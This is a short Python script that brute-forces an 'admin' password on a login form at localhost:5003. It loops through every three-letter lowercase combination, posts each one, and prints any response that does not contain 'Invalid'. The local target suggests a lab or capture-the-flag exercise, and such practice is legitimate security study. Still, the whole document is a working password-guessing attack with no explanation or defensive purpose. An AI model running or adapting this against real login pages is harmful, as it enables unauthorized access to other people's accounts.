import requests
from string import ascii_lowercase, digits
url = 'http://localhost:5003/login'
# Brute force 3 character lowercase password for admin
def try_passwords():
    for a in ascii_lowercase:
        for b in ascii_lowercase:
            for c in ascii_lowercase:
                pwd = a+b+c
                r = requests.post(url, data={'username':'admin','password':pwd})
                if r.status_code == 200 or 'Invalid' not in r.text:
                    print(f'{pwd} : {r.status_code} : {r.text}')
try_passwords()
